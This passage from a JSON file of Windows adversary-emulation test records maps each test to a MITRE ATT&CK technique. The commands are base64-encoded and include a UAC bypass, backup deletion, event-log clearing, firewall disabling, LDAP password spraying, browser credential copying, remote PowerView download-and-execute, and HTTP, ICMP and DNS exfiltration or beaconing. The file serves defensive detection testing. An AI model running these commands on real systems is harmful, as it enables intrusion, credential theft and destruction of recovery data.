"IyBJbXBvcnQgdGhlIHJlcXVpcmVkIHRlc3QgaGFybmVzcyBmdW5jdGlvbiwgSW52b2tlLUJ1aWxkQW5kSW52b2tlSW5zdGFsbFV0aWxBc3NlbWJseTsgLiBlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczE7IDsgJEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6VEVNUFwiOyAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZSA9ICJUMTIxOC4wMDQuZGxsIjsgJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGggPSBKb2luLVBhdGggLVBhdGggJEluc3RhbGxlckFzc2VtYmx5RGlyIC1DaGlsZFBhdGggJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7IDsgJENvbW1hbmRMaW5lID0gIi8/IGAiJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGhgIiI7ICRFeHBlY3RlZE91dHB1dCA9ICdDb25zdHJ1Y3Rvcl9IZWxwVGV4dF8nOyA7ICRUZXN0QXJncyA9IEB7OyAgICAgT3V0cHV0QXNzZW1ibHlEaXJlY3RvcnkgPSAkSW5zdGFsbGVyQXNzZW1ibHlEaXI7ICAgICBPdXRwdXRBc3NlbWJseUZpbGVOYW1lID0gJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7ICAgICBJbnZvY2F0aW9uTWV0aG9kID0gJ0V4ZWN1dGFibGUnOyAgICAgQ29tbWFuZExpbmUgPSAkQ29tbWFuZExpbmU7IH07IDsgJEFjdHVhbE91dHB1dCA9IEludm9rZS1CdWlsZEFuZEludm9rZUluc3RhbGxVdGlsQXNzZW1ibHkgQFRlc3RBcmdzOyA7IGlmICgkQWN0dWFsT3V0cHV0IC1uZSAkRXhwZWN0ZWRPdXRwdXQpIHs7ICAgICB0aHJvdyBAIjsgSW5zdGFsbFV0aWwgSGVscFRleHQgcHJvcGVydHkgZXhlY3V0aW9uIHRlc3QgZmFpbHVyZS4gSW5zdGFsbGVyIGFzc2VtYmx5IGV4ZWN1dGlvbiBvdXRwdXQgZGlkIG5vdCBtYXRjaCB0aGUgZXhwZWN0ZWQgb3V0cHV0LjsgRXhwZWN0ZWQ6ICRFeHBlY3RlZE91dHB1dDsgQWN0dWFsOiAkQWN0dWFsT3V0cHV0OyAiQDsgfQ==", "ability_id": "95efe235d7d28a8a7f0c412ffbc4f256", "technique_name": "Signed Binary Proxy Execution: InstallUtil", "additional_info": {}, "privilege": "", "technique_id": "T1218.004", "platform": "windows", "name": "InstallUtil HelpText method call", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["eaecbe_InstallUtilTestHarness.ps1"], "cleanup": ["JEluc3RhbGxlckFzc2VtYmx5RGlyID0gIiRFbnY6VEVNUFwiOyAkSW5zdGFsbGVyQXNzZW1ibHlGaWxlTmFtZSA9ICJUMTIxOC4wMDQuZGxsIjsgJEluc3RhbGxlckFzc2VtYmx5RnVsbFBhdGggPSBKb2luLVBhdGggLVBhdGggJEluc3RhbGxlckFzc2VtYmx5RGlyIC1DaGlsZFBhdGggJEluc3RhbGxlckFzc2VtYmx5RmlsZU5hbWU7IFJlbW92ZS1JdGVtIC1QYXRoICRJbnN0YWxsZXJBc3NlbWJseUZ1bGxQYXRoIC1FcnJvckFjdGlvbiBJZ25vcmU=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJlYWVjYmVfSW5zdGFsbFV0aWxUZXN0SGFybmVzcy5wczEi"], "executor": "psh", "access": {}, "description": "Executes the Uninstall Method. Upon execution, help information will be displayed for InstallUtil.\n", "variations": []}, {"test": "d21pYy5leGUgZ3JvdXAgZ2V0IG5hbWU=", "ability_id": "53f5c5712bf6c008a24c38fe60700d2e", "technique_name": "Permission Groups Discovery: Local Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.001", "platform": "windows", "name": "Wmic Group Discovery", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Utilizing wmic.exe to enumerate groups on the local system. Upon execution, information will be displayed of local groups on system.\n", "variations": []}, {"test": "cG93ZXJzaGVsbCAtZXhlY3V0aW9ucG9saWN5IGJ5cGFzcyAtY29tbWFuZCBhYWI0YThfR2V0LUluYm94LnBzMSAtZmlsZSAkZW52OlRFTVBcbWFpbC5jc3Y=", "ability_id": "bb089bbf58ca394664e8109340fcc1a7", "technique_name": "Email Collection: Local Email Collection", "additional_info": {}, "privilege": "", "technique_id": "T1114.001", "platform": "windows", "name": "Email Collection with PowerShell Get-Inbox", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["aab4a8_Get-Inbox.ps1"], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXG1haWwuY3N2IC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3Jl", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJhYWI0YThfR2V0LUluYm94LnBzMSI="], "executor": "psh", "access": {}, "description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.\nSuccessful execution will produce stdout message stating \"Please be patient, this may take some time...\". Upon completion, final output will be a mail.csv file.\n\nNote: Outlook is required, but no email account necessary to produce artifacts.\n", "variations": []}, {"test": "ZWNobyAiSGVsbG8gZnJvbSB0aGUgV2luZG93cyBDb21tYW5kIFByb21wdCEiID4gIiVURU1QJVx0ZXN0LmJpbiIgJiB0eXBlICIlVEVNUCVcdGVzdC5iaW4i", "ability_id": "f38e58deb7ad20b5538ca40db7b7b4f8", "technique_name": "Command and Scripting Interpreter: Windows Command Shell", "additional_info": {}, "privilege": "", "technique_id": "T1059.003", "platform": "windows", "name": "Writes text to a file and displays it.", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICIlVEVNUCVcdGVzdC5iaW4iID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Writes text to a file and display the results. This test is intended to emulate the dropping of a malicious file to disk.\n", "variations": []}, {"test": "d2JhZG1pbiBkZWxldGUgc3lzdGVtc3RhdGViYWNrdXAgLWtlZXBWZXJzaW9uczow", "ability_id": "8af540e33bedd20ad6122751d2c996a2", "technique_name": "Inhibit System Recovery", "additional_info": {}, "privilege": "", "technique_id": "T1490", "platform": "windows", "name": "Windows - wbadmin Delete systemstatebackup", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled.\n", "variations": []}, {"test": "Q29weS1JdGVtICIkZW52OkFQUERBVEFcT3BlcmEgU29mdHdhcmVcT3BlcmEgU3RhYmxlXExvZ2luIERhdGEiIC1EZXN0aW5hdGlvbiAkZW52OnRlbXA=", "ability_id": "32df42a1c7b596e73b7e4eee24438994", "technique_name": "Credentials from Password Stores: Credentials from Web Browsers", "additional_info": {}, "privilege": "", "technique_id": "T1555.003", "platform": "windows", "name": "Simulating access to Opera Login Data", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLVBhdGggIiRlbnY6dGVtcFxMb2dpbiBEYXRhIiAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "Simulates an adversary accessing encrypted credentials from Opera web browser's login database. \n", "variations": []}, {"test": "JHBpbmcgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuTmV0d29ya2luZm9ybWF0aW9uLnBpbmc7IGZvcmVhY2goJERhdGEgaW4gR2V0LUNvbnRlbnQgLVBhdGggQzpcV2luZG93c1xTeXN0ZW0zMlxub3RlcGFkLmV4ZSAtRW5jb2RpbmcgQnl0ZSAtUmVhZENvdW50IDEwMjQpIHsgJHBpbmcuU2VuZCgiMTI3LjAuMC4xIiwgMTUwMCwgJERhdGEpIH0=", "ability_id": "9618418b26d98e246639f27fa73dfc91", "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol", "additional_info": {}, "privilege": "", "technique_id": "T1048.003", "platform": "windows", "name": "Exfiltration Over Alternative Protocol - ICMP", "requirements": [], "tactic": "exfiltration", "buckets": ["exfiltration"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n", "variations": []}, {"test": "ZmluZHN0ciAvUyBjcGFzc3dvcmQgJWxvZ29uc2VydmVyJVxzeXN2b2xcKi54bWw=", "ability_id": "53d863a190b41b6af474be875b74784b", "technique_name": "Unsecured Credentials: Group Policy Preferences", "additional_info": {}, "privilege": "", "technique_id": "T1552.006", "platform": "windows", "name": "GPP Passwords (findstr)", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.\n", "variations": []}, {"test": "cmVnLmV4ZSBhZGQgaGtjdVxzb2Z0d2FyZVxjbGFzc2VzXG1zLXNldHRpbmdzXHNoZWxsXG9wZW5cY29tbWFuZCAvdmUgL2QgIkM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSIgL2YgJiYgcmVnLmV4ZSBhZGQgaGtjdVxzb2Z0d2FyZVxjbGFzc2VzXG1zLXNldHRpbmdzXHNoZWxsXG9wZW5cY29tbWFuZCAvdiAiRGVsZWdhdGVFeGVjdXRlIiAvZiAmJiBmb2RoZWxwZXIuZXhl", "ability_id": "610f43d452a3af7d336e471a170853c9", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "Bypass UAC using Fodhelper", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnLmV4ZSBkZWxldGUgaGtjdVxzb2Z0d2FyZVxjbGFzc2VzXG1zLXNldHRpbmdzIC9mID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n", "variations": []}, {"test": "bXYgbWlzc2lvbi5nbyBtaXNzaW9uLmV4ZTsuXG1pc3Npb24uZXhlIC1kdXJhdGlvbiA2MCAtZXh0ZW5zaW9uIC5jYWxkZXJhIC1kaXIgJ0M6XCc7", "ability_id": "55f9600a-756f-496b-b27f-682052dc429c", "technique_name": "Data Manipulation: Stored Data Manipulation", "additional_info": {}, "privilege": "", "technique_id": "T1565.001", "platform": "windows", "name": "File Hunter Mission", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["mission.go"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJtaXNzaW9uLmdvIg=="], "executor": "psh", "access": {}, "description": "Hunts for files of a certain extension and inserts a message", "variations": []}, {"test": "UkVHIEFERCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxJbWFnZSBGaWxlIEV4ZWN1dGlvbiBPcHRpb25zXCN7dGFyZ2V0X2JpbmFyeX0iIC92IERlYnVnZ2VyIC9kICIje3BheWxvYWRfYmluYXJ5fSI=", "ability_id": "0015b2f41225be8f03c104f772e98213", "technique_name": "Event Triggered Execution: Image File Execution Options Injection", "additional_info": {}, "privilege": "", "technique_id": "T1546.012", "platform": "windows", "name": "IFEO Add Debugger", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSAiSEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXEltYWdlIEZpbGUgRXhlY3V0aW9uIE9wdGlvbnNcQzpcV2luZG93c1xTeXN0ZW0zMlxjYWxjLmV4ZSIgL3YgRGVidWdnZXIgL2YgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Leverage Global Flags Settings\n", "variations": []}, {"test": "JGZpbGVOYW1lID0gIkM6XHRlbXBcVDEwMjBfZXhmaWxGaWxlLnR4dCI7ICR1cmwgPSAiaHR0cHM6Ly9nb29nbGUuY29tIjsgJGZpbGUgPSBOZXctSXRlbSAtRm9yY2UgJGZpbGVOYW1lIC1WYWx1ZSAiVGhpcyBpcyBBUlQgSWNlZElEIEJvdG5ldCBFeGZpbCBUZXN0IjsgJGNvbnRlbnRUeXBlID0gImFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSI7IHRyeSB7SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdXJsIC1NZXRob2QgUHV0IC1Db250ZW50VHlwZSAkY29udGVudFR5cGUgLUluRmlsZSAkZmlsZU5hbWV9IGNhdGNoe30=", "ability_id": "b7dec45aa350b4ec6f1c41336e1f7a14", "technique_name": "Automated Exfiltration", "additional_info": {}, "privilege": "", "technique_id": "T1020", "platform": "windows", "name": "IcedID Botnet HTTP PUT", "requirements": [], "tactic": "exfiltration", "buckets": ["exfiltration"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGZpbGVOYW1lID0gIkM6XHRlbXBcVDEwMjBfZXhmaWxGaWxlLnR4dCI7IFJlbW92ZS1JdGVtIC1QYXRoICRmaWxlTmFtZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file", "variations": []}, {"test": "c3RhcnQgMDFiNjMzX0NhbGN1bGF0b3IuZG9jeA==", "ability_id": "e44e818e80f6761a1fef5d5d6f27b5f5", "technique_name": "Template Injection", "additional_info": {}, "privilege": "", "technique_id": "T1221", "platform": "windows", "name": "WINWORD Remote Template Injection", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["01b633_Calculator.docx"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Open a .docx file that loads a remote .dotm macro enabled template from https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm \nExecutes the code specified within the .dotm template.\nRequires download of WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  \nDefault docs file opens Calculator.exe when test sucessfully executed, while AV turned off.\n", "variations": []}, {"test": "U2V0LUxvY2F0aW9uIFBhdGhUb0F0b21pY3NGb2xkZXI7IC5cVDEwNzEuMDA0XHNyY1xUMTA3MS1kbnMtYmVhY29uLnBzMSAtRG9tYWluIDEyNy4wLjAuMS54aXAuaW8gLVN1YmRvbWFpbiBhdG9taWNyZWR0ZWFtIC1RdWVyeVR5cGUgVFhUIC1DMkludGVydmFsIDMwIC1DMkppdHRlciAyMCAtUnVuVGltZSAzMA==", "ability_id": "0d3d2fc5ad58e805a83edc76b45db3b5", "technique_name": "Application Layer Protocol: DNS", "additional_info": {}, "privilege": "", "technique_id": "T1071.004", "platform": "windows", "name": "DNS Regular Beaconing", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n", "variations": []}, {"test": "TmV3LUl0ZW0gLVBhdGggIi4iIC1OYW1lICJzdGFnZWQiIC1JdGVtVHlwZSAiZGlyZWN0b3J5IiAtRm9yY2UgfCBmb3JlYWNoIHskXy5GdWxsTmFtZX0gfCBTZWxlY3QtT2JqZWN0", "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89", "technique_name": "Data Staged: Local Data Staging", "additional_info": {}, "privilege": "", "technique_id": "T1074.001", "platform": "windows", "name": "Create staging directory", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "relationships": [{"edge": "", "source": "host.dir.staged", "custom_parser_vals": {}, "target": ""}]}], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLVBhdGggInN0YWdlZCIgLXJlY3Vyc2U="], "executor": "psh", "access": {}, "description": "create a directory for exfil staging", "variations": []}, {"test": "R2V0LUNoaWxkSXRlbSBDOlxVc2VycyAtUmVjdXJzZSAtSW5jbHVkZSAqLiN7ZmlsZS5zZW5zaXRpdmUuZXh0ZW5zaW9ufSAtRXJyb3JBY3Rpb24gJ1NpbGVudGx5Q29udGludWUnIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgU2VsZWN0LU9iamVjdCAtZmlyc3QgNTtleGl0IDA7", "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b", "technique_name": "Data from Local System", "additional_info": {}, "privilege": "", "technique_id": "T1005", "platform": "windows", "name": "Find files", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "relationships": [{"edge": "has_extension", "source": "host.file.path", "custom_parser_vals": {}, "target": "file.sensitive.extension"}]}], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Locate files deemed sensitive", "variations": []}, {"test": "c2MuZXhlIHN0b3Agc3Bvb2xlcg==", "ability_id": "a1201f5a49da6cb51a1af67ee0be79e1", "technique_name": "Service Stop", "additional_info": {}, "privilege": "", "technique_id": "T1489", "platform": "windows", "name": "Windows - Stop service using Service Controller", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c2MuZXhlIHN0YXJ0IHNwb29sZXIgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying\nit has changed to a state of STOP_PENDING. If the spooler service was not running \"The service has not been started.\" will be displayed and it can be\nstarted by running the cleanup command.\n", "variations": []}, {"test": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgSUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvbWFzdGVyL1JlY29uL1Bvd2VyVmlldy5wczEnIC1Vc2VCYXNpY1BhcnNpbmcpOyBHZXQtRG9tYWluQ29udHJvbGxlciAtdmVyYm9zZQ==", "ability_id": "aaeee9107989a507f526b0cef1cb274f", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Get-DomainController with PowerView", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.\n", "variations": []}, {"test": "cmVnIGFkZCAiSEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xTaGFyZWRBY2Nlc3NcUGFyYW1ldGVyc1xGaXJld2FsbFBvbGljeVxQdWJsaWNQcm9maWxlIiAvdiAiRW5hYmxlRmlyZXdhbGwiIC90IFJFR19EV09SRCAvZCAwIC9m", "ability_id": "8fe59e288f10a486dc8b44bc872019ff", "technique_name": "Impair Defenses: Disable or Modify System Firewall", "additional_info": {}, "privilege": "", "technique_id": "T1562.004", "platform": "windows", "name": "Disable Microsoft Defender Firewall via Registry", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGFkZCAiSEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xTaGFyZWRBY2Nlc3NcUGFyYW1ldGVyc1xGaXJld2FsbFBvbGljeVxQdWJsaWNQcm9maWxlIiAvdiAiRW5hYmxlRmlyZXdhbGwiIC90IFJFR19EV09SRCAvZCAxIC9m"], "executor": "cmd", "access": {}, "description": "Disables the Microsoft Defender Firewall for the public profile via registry\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n", "variations": []}, {"test": "aWYgKCJOVExNIi5Ub0xvd2VyKCkgLU5vdEluIEAoIm50bG0iLCJrZXJiZXJvcyIpKSB7OyAgIFdyaXRlLUhvc3QgIk9ubHkgJ05UTE0nIGFuZCAnS2VyYmVyb3MnIGF1dGggbWV0aG9kcyBhcmUgc3VwcG9ydGVkIjsgICBleGl0IDE7IH07IDsgJERvbWFpblVzZXJzID0gR2V0LUFEVXNlciAtTERBUEZpbHRlciAnKCYoc0FNQWNjb3VudFR5cGU9ODA1MzA2MzY4KSghKFVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yKSkpJyAtU2VydmVyICRlbnY6VXNlckRuc0RvbWFpbiB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IFNhbUFjY291bnROYW1lOyA7IFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoIlN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5Qcm90b2NvbHMiKSB8IE91dC1OdWxsOyAkZGkgPSBuZXctb2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5Qcm90b2NvbHMuTGRhcERpcmVjdG9yeUlkZW50aWZpZXIoIiRlbnY6VXNlckRuc0RvbWFpbiIsMzg5KTsgOyAkRG9tYWluVXNlcnMgfCBGb3JlYWNoLU9iamVjdCB7OyAgICR1c2VyID0gJF87ICAgJHBhc3N3b3JkID0gJ1BAc3N3MHJkISc7IDsgICAkY3JlZHogPSBuZXctb2JqZWN0IFN5c3RlbS5OZXQuTmV0d29ya0NyZWRlbnRpYWwoJHVzZXIsICRwYXNzd29yZCwgIiRlbnY6VXNlckRuc0RvbWFpbiIpOyAgICRjb25uID0gbmV3LW9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuUHJvdG9jb2xzLkxkYXBDb25uZWN0aW9uKCRkaSwgJGNyZWR6LCBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlByb3RvY29scy5BdXRoVHlwZV06Ok5UTE0pOyAgIHRyeSB7OyAgICAgV3JpdGUtSG9zdCAiIFstXSBBdHRlbXB0aW5nICR7cGFzc3dvcmR9IG9uIGFjY291bnQgJHt1c2VyfS4iOyAgICAgJGNvbm4uYmluZCgpOyAgICAgIyBpZiBjcmVkZW50aWFscyBhcmVuJ3QgY29ycmVjdCwgaXQgd2lsbCBicmVhayBqdXN0IGFib3ZlIGFuZCBnb2VzIGludG8gY2F0Y2ggYmxvY2ssIHNvIGlmIHdlJ3JlIGhlcmUgd2UgY2FuIGRpc3BsYXkgc3VjY2VzczsgICAgIFdyaXRlLUhvc3QgIiBbIV0gJHt1c2VyfToke3Bhc3N3b3JkfSBhcmUgdmFsaWQgY3JlZGVudGlhbHMhIjsgICB9IGNhdGNoIHs7ICAgICBXcml0ZS1Ib3N0ICRfLkV4Y2VwdGlvbi5NZXNzYWdlOyAgIH07IH07IFdyaXRlLUhvc3QgIkVuZCBvZiBwYXNzd29yZCBzcHJheWluZyI=", "ability_id": "b50164c080c5b4c22e0cfdacd390207c", "technique_name": "Brute Force: Password Spraying", "additional_info": {}, "privilege": "", "technique_id": "T1110.003", "platform": "windows", "name": "Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Attempt to brute force all Active Directory domain users with a single password (called \"password spraying\") on a domain controller, via LDAP, with NTLM or Kerberos\n\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)\n", "variations": []}, {"test": "bmx0ZXN0IC9kb21haW5fdHJ1c3Rz", "ability_id": "cfb61005899996469ae3023796792ca5", "technique_name": "Domain Trust Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1482", "platform": "windows", "name": "Windows - Discover domain trusts with nltest", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n", "variations": []}, {"test": "d2V2dHV0aWwgY2wgU3lzdGVt", "ability_id": "79297f1631143a6aacac233f0fd38bba", "technique_name": "Indicator Removal on Host: Clear Windows Event Logs", "additional_info": {}, "privilege": "", "technique_id": "T1070.001", "platform": "windows", "name": "Clear Logs", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty.\n", "variations": []}, {"test": "SW52b2tlLUFUSENvbXBpbGVkSGVscCAtU2ltdWxhdGVVc2VyRG91YmxlQ2xpY2sgLUNITUZpbGVQYXRoIFRlc3QuY2ht", "ability_id": "9c3da34af0cd74b7110b8e3826b7b7bd", "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "additional_info": {}, "privilege": "", "technique_id": "T1218.001", "platform": "windows", "name": "Invoke CHM Simulate Double click", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes a CHM file simulating a user double click.", "variations": []}, {"test": "d2hlcmUgL1IgQzpcVXNlcnNcIEJvb2ttYXJrcw==", "ability_id": "ee12056a74be07c381877d47531429b6", "technique_name": "Browser Bookmark Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1217", "platform": "windows", "name": "List Google Chrome / Edge Chromium Bookmarks on Windows with command prompt", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Searches for Google Chromes's and Edge Chromium's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n", "variations": []}, {"test": "Q29weS1JdGVtIEM6XFdpbmRvd3Ncc3lzdGVtMzJcV2luZG93c1Bvd2VyU2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSBDOlxXaW5kb3dzXFRlbXBcZGVidWcuZXhlO0M6XFdpbmRvd3NcVGVtcFxkZWJ1Zy5leGUgZ2V0LXByb2Nlc3MgPj4gQzpcV2luZG93c1x0ZW1wXGRlYnVnLmxvZztDOlxXaW5kb3dzXFRlbXBcZGVidWcuZXhlIGdldC1sb2NhbGdyb3VwID4+IEM6XFdpbmRvd3NcdGVtcFxkZWJ1Zy5sb2c7QzpcV2luZG93c1xUZW1wXGRlYnVnLmV4ZSBnZXQtbG9jYWx1c2VyID4+IEM6XFdpbmRvd3NcdGVtcFxkZWJ1Zy5sb2c7QzpcV2luZG93c1xUZW1wXGRlYnVnLmV4ZSBHZXQtSXRlbVByb3BlcnR5IFJlZ2lzdHJ5OjpIS0VZX0xPQ0FMX01BQ0hJTkVcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb24gPj4gQzpcV2luZG93c1x0ZW1wXGRlYnVnLmxvZzs=", "ability_id": "e5f9de8f-3df1-4e78-ad92-a784e3f6770d", "technique_name": "PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "Move Powershell & triage", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Copy powershell to non-standard location and perform triage commands", "variations": []}, {"test": 